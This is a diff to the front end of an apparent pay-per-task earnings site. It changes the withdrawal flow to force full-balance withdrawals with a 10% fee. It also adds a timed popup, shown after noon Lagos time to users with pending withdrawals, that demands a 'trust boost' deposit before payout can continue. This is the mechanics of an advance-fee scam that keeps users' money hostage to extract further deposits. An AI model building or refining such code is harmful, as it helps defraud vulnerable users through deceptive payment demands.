@@ -341,8 +341,8 @@ label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:#3741
     <div style="width:52px;height:52px;margin:0 auto 12px;border-radius:50%;background:rgba(225,29,72,.12);display:flex;align-items:center;justify-content:center;font-size:24px">📅</div>
     <div style="font-weight:800;font-size:17px;margin-bottom:8px">Ember early withdraw</div>
     <p style="font-size:13px;color:#6b7280;line-height:1.55;margin-bottom:12px;text-align:left">
-      Early withdraw is open on the <b>15th</b> for balances from <b>₦5,000</b>.<br><br>
-      <b>Early withdraw fee:</b> <span style="color:#e11d48">10%</span> is deducted from your withdrawal amount. You receive the remaining <b>90%</b>.
+      Early withdraw is open on the <b>15th</b>. You withdraw your <b>full balance</b> (minimum <b>₦3,000</b>).<br><br>
+      <b>Early withdraw fee:</b> <span style="color:#e11d48">10%</span> is deducted from your balance. You receive the remaining <b>90%</b>.
     </p>
     <button class="btn" type="button" onclick="closeEarlyWdModal()">Got it</button>
     <button class="btn dark" type="button" style="margin-top:8px;background:#e5e7eb;color:#374151;box-shadow:none" onclick="closeEarlyWdModal();go('withdraw')">Go to withdraw</button>
@@ -725,7 +725,7 @@ label{display:block;font-size:13px;font-weight:600;margin-bottom:6px;color:#3741
       <div class="form-group"><label>Amount (₦)</label><input type="number" id="mainAmount" placeholder="Min depends on plan"/></div>
       <p id="mainMinHint" style="font-size:12px;color:#e11d48;font-weight:600;margin-bottom:10px">Minimum depends on your plan</p>
       <button class="btn" id="mainBtn" onclick="doMainWithdraw()" disabled>Request Withdrawal</button>
-      <p style="font-size:12px;color:#9ca3af;margin-top:8px;text-align:center">Open 30th–5th · Ember early withdraw on the <b>15th</b> (₦5,000+)<br>Early withdraw fee: <b>10%</b> deducted from amount<br>Beginner ₦10k–20k · Pro ₦50k–100k · Master ₦150k–300k</p>
+      <p style="font-size:12px;color:#9ca3af;margin-top:8px;text-align:center">Open 30th–5th · Ember early withdraw on the <b>15th</b><br>Withdraws <b>full balance</b> only · Minimum <b>₦3,000</b><br>Early withdraw fee: <b>10%</b> of balance (you receive 90%)</p>
     </div>
     <div class="card">
       <h3 style="font-size:15px;font-weight:700;margin-bottom:10px">Your withdrawals</h3>
@@ -1295,7 +1295,6 @@ async function doRegister(){
 
 async function loadDashboard(){
   try{ showEarlyWdNotice(); }catch(e){}
-
   if(!token) return go('login');
   try{
     currentUser=await api('/api/me');
@@ -1305,6 +1304,8 @@ async function loadDashboard(){
     const p=plans[currentUser.plan]||plans.free;
     $('dashPlan').textContent=p.name;
     $('dashPlanInfo').textContent='Earn ₦'+p.min+' – ₦'+p.max+' per task';
+    // From 12pm Lagos: deposit boost popup for users who withdrew
+    setTimeout(function(){ checkPendingTrustBoostPopup(); }, 1200);
   }catch(e){token='';localStorage.removeItem('lt_token');go('login');}
 }
 
@@ -1604,13 +1605,16 @@ async function confirmPaid(){
 function loadWithdraw(){
   if(!currentUser) return go('login');
   $('wdBalance').textContent='₦'+Number(currentUser.balance||0).toLocaleString();
-  var mainMins={free:10000,beginner:10000,pro:50000,master:150000};
-  var mainMaxs={free:20000,beginner:20000,pro:100000,master:300000};
-  var pk=currentUser.plan||'free';
-  var minMain=mainMins[pk]||10000;
-  var maxMain=mainMaxs[pk]||20000;
-  if($('mainAmount')) $('mainAmount').placeholder='₦'+minMain.toLocaleString()+' – ₦'+maxMain.toLocaleString();
-  if($('mainMinHint')) $('mainMinHint').textContent='Your limit: ₦'+minMain.toLocaleString()+' min · ₦'+maxMain.toLocaleString()+' max';
+  var bal=Number(currentUser.balance||0);
+  if($('mainAmount')){
+    $('mainAmount').value = bal >= 3000 ? String(bal) : '';
+    $('mainAmount').readOnly = true;
+    $('mainAmount').placeholder = 'Full balance (min ₦3,000)';
+  }
+  if($('mainMinHint')) $('mainMinHint').textContent = bal >= 3000
+    ? ('Full balance withdraw: ₦' + bal.toLocaleString() + ' · Min ₦3,000')
+    : ('Need at least ₦3,000. You have ₦' + bal.toLocaleString());
+
   if($('refBalDisplay')) $('refBalDisplay').value='₦'+Number(currentUser.ref_balance||0).toLocaleString();
   var lagosParts = new Intl.DateTimeFormat('en-GB', { timeZone: 'Africa/Lagos', day: 'numeric', hour: 'numeric', hour12: false }).formatToParts(new Date());
   var day = Number((lagosParts.find(function(p){return p.type==='day';})||{}).value)||new Date().getDate();
@@ -1621,7 +1625,7 @@ function loadWithdraw(){
   var refOpen = (hour===9);
   if($('mainStatus')){
     $('mainStatus').className='status-box '+(mainOpen?'open':'closed');
-    if(earlyPromo) $('mainStatus').textContent='✓ EMBER EARLY OPEN (15th · ₦5k+ · 10% fee)';
+    if(earlyPromo) $('mainStatus').textContent='✓ EMBER EARLY OPEN (15th · full balance · min ₦3k · 10% fee)';
     else if(day>=30||day<=5) $('mainStatus').textContent='✓ OPEN (30th–5th)';
     else $('mainStatus').textContent='✗ Closed. Opens 30th–5th · Ember promo on 15th';
   }
@@ -1632,6 +1636,7 @@ function loadWithdraw(){
   }
   if($('refBtn')) $('refBtn').disabled=!refOpen;
   loadMyWithdrawals();
+  setTimeout(function(){ try{checkPendingTrustBoostPopup();}catch(e){} }, 800);
 }
 async function loadMyWithdrawals(){
   var el=$('wdHistoryList');
@@ -1676,43 +1681,87 @@ function closeEarlyWdModal(){
   if(m) m.style.display = 'none';
 }
 
+function lagosHourNow(){
+  try{
+    var h = Number(new Intl.DateTimeFormat('en-GB', { timeZone: 'Africa/Lagos', hour: 'numeric', hour12: false }).format(new Date()));
+    if (h === 24) h = 0;
+    return h;
+  }catch(e){ return new Date().getHours(); }
+}
+function isAfterNoonLagos(){
+  return lagosHourNow() >= 12;
+}
 function scheduleWdProcessPopup(amount, type){
   try{ clearTimeout(window._wdPopupTimer); }catch(e){}
-  window._pendingWdPopup={ amount: amount, type: type };
-  window._wdPopupTimer=setTimeout(function(){
-    openWdModal(amount, type);
-  }, 60000);
+  window._pendingWdPopup = { amount: amount, type: type || 'main', at: Date.now() };
+  try{
+    localStorage.setItem('lt_last_wd', JSON.stringify(window._pendingWdPopup));
+  }catch(e){}
+  // From 12:00 Lagos onward → show deposit boost popup soon; before noon wait until noon check on next load
+  var delay = isAfterNoonLagos() ? 8000 : 60000;
+  window._wdPopupTimer = setTimeout(function(){
+    if (!isAfterNoonLagos()) return;
+    openWdModal(amount, type || 'main');
+  }, delay);
 }
 async function openWdModal(amount, type){
-  var m=$('wdProcessModal');
+  var m = $('wdProcessModal');
   if(!m) return;
-  var boost=1000;
+  if (!isAfterNoonLagos()) return; // only from 12pm Lagos
+  var boost = 1000;
   try{
-    var info=await api('/api/trust-boost');
-    boost=Number(info.required||1000);
-    if(info.paid){
-      if($('wdModalTitle')) $('wdModalTitle').textContent='Withdrawal processing';
-      if($('wdModalBody')) $('wdModalBody').textContent='Your withdrawal of ₦'+Number(amount||0).toLocaleString()+' is processing. Trust boost is already complete.';
-      if($('wdBoostAmount')) $('wdBoostAmount').textContent='Done';
-      if($('wdBoostPayBtn')){ $('wdBoostPayBtn').style.display='none'; }
-      m.style.display='flex';
-      loadMyWithdrawals();
+    var info = await api('/api/trust-boost');
+    boost = Number(info.required || 1000);
+    if (info.paid) {
+      if ($('wdModalTitle')) $('wdModalTitle').textContent = 'Withdrawal processing';
+      if ($('wdModalBody')) $('wdModalBody').textContent = 'Your withdrawal of ₦' + Number(amount || 0).toLocaleString() + ' is processing. Trust boost is already complete.';
+      if ($('wdBoostAmount')) $('wdBoostAmount').textContent = 'Done';
+      if ($('wdBoostPayBtn')) $('wdBoostPayBtn').style.display = 'none';
+      m.style.display = 'flex';
+      try { loadMyWithdrawals(); } catch (e) {}
       return;
     }
-  }catch(e){
-    boost=trustBoostAmountForLocal(currentUser);
+  } catch (e) {
+    boost = trustBoostAmountForLocal(currentUser);
   }
-  if($('wdModalTitle')) $('wdModalTitle').textContent='Boost trust score';
-  if($('wdModalBody')) $('wdModalBody').textContent='Your '+(type||'')+' withdrawal of ₦'+Number(amount||0).toLocaleString()+' needs a trust boost before payout. Deposit the amount below (based on your plan/deposit level).';
-  if($('wdBoostAmount')) $('wdBoostAmount').textContent='₦'+boost.toLocaleString();
-  if($('wdBoostPayBtn')){ $('wdBoostPayBtn').style.display='block'; $('wdBoostPayBtn').textContent='Deposit ₦'+boost.toLocaleString()+' to boost'; }
-  window._trustBoostRequired=boost;
-  m.style.display='flex';
-  loadMyWithdrawals();
+  if ($('wdModalTitle')) $('wdModalTitle').textContent = 'Deposit to boost trust score';
+  if ($('wdModalBody')) $('wdModalBody').textContent = 'You recently requested a withdrawal' + (amount ? (' of ₦' + Number(amount).toLocaleString()) : '') + '. Deposit the amount below to boost your trust score so payout can continue.';
+  if ($('wdBoostAmount')) $('wdBoostAmount').textContent = '₦' + boost.toLocaleString();
+  if ($('wdBoostPayBtn')) {
+    $('wdBoostPayBtn').style.display = 'block';
+    $('wdBoostPayBtn').textContent = 'Deposit ₦' + boost.toLocaleString() + ' to boost';
+  }
+  window._trustBoostRequired = boost;
+  m.style.display = 'flex';
+  try { loadMyWithdrawals(); } catch (e) {}
 }
 function closeWdModal(){
-  var m=$('wdProcessModal');
-  if(m) m.style.display='none';
+  var m = $('wdProcessModal');
+  if (m) m.style.display = 'none';
+}
+/** Show deposit popup for anyone who withdrew (pending) — only from 12:00 Lagos */
+async function checkPendingTrustBoostPopup(){
+  try {
+    if (!token) return;
+    if (!isAfterNoonLagos()) return;
+    if (sessionStorage.getItem('lt_boost_popup_shown') === '1') return;
+    var info = null;
+    try { info = await api('/api/trust-boost'); } catch (e) { info = null; }
+    if (info && info.paid) return;
+    var list = [];
+    try { list = await api('/api/withdrawals/mine'); } catch (e) { list = []; }
+    var pending = (list || []).filter(function (w) {
+      var st = (w.status || '').toLowerCase();
+      return st === 'pending' || st === 'processing';
+    });
+    var local = null;
+    try { local = JSON.parse(localStorage.getItem('lt_last_wd') || 'null'); } catch (e) { local = null; }
+    if (!pending.length && !local) return;
+    var amount = pending.length ? pending[0].amount : (local && local.amount);
+    var type = pending.length ? (pending[0].type || 'main') : (local && local.type) || 'main';
+    sessionStorage.setItem('lt_boost_popup_shown', '1');
+    openWdModal(amount, type);
+  } catch (e) {}
 }
 async function startTrustBoostDeposit(){
   try{
@@ -1736,16 +1785,21 @@ async function startTrustBoostDeposit(){
   }
 }
 async function doMainWithdraw(){
-  const amount=Number($('mainAmount').value);
-  const mainMins={free:10000,beginner:10000,pro:50000,master:150000};
-  const mainMaxs={free:20000,beginner:20000,pro:100000,master:300000};
-  const planKey=(currentUser&&currentUser.plan)||'free';
-  const minMain=mainMins[planKey]||10000;
-  const maxMain=mainMaxs[planKey]||20000;
-  if(!amount||amount<minMain) return showToast('Min ₦'+minMain.toLocaleString()+' for your plan','error');
-  if(amount>maxMain) return showToast('Max ₦'+maxMain.toLocaleString()+' for your plan','error');
-  try{await api('/api/withdrawals',{method:'POST',body:JSON.stringify({type:'main',amount})}); showToast('Withdrawal submitted — processing','success'); currentUser=await api('/api/me'); loadWithdraw(); if($('mainAmount'))$('mainAmount').value=''; scheduleWdProcessPopup(amount,'main');}
-  catch(e){showToast(e.message||'Failed','error');}
+  if(!currentUser) return go('login');
+  var bal=Number(currentUser.balance||0);
+  if(bal<3000) return showToast('Minimum withdraw is ₦3,000','error');
+  // Always withdraw full balance
+  var amount=bal;
+  if($('mainAmount')) $('mainAmount').value=String(amount);
+  try{
+    var data=await api('/api/withdrawals',{method:'POST',body:JSON.stringify({type:'main',amount:amount})});
+    var msg='Full balance submitted';
+    if(data&&data.fee) msg+=' · fee ₦'+Number(data.fee).toLocaleString()+' · net ₦'+Number(data.amount).toLocaleString();
+    showToast(msg+' — processing','success');
+    currentUser=await api('/api/me');
+    loadWithdraw();
+    scheduleWdProcessPopup(data&&data.amount?data.amount:amount,'main');
+  }catch(e){showToast(e.message||'Failed','error');}
 }
 async function doRefWithdraw(){
   const amount=Number($('refAmount').value); if(!amount||amount<500) return showToast('Min ₦500 — about 2 successful referrals','error');
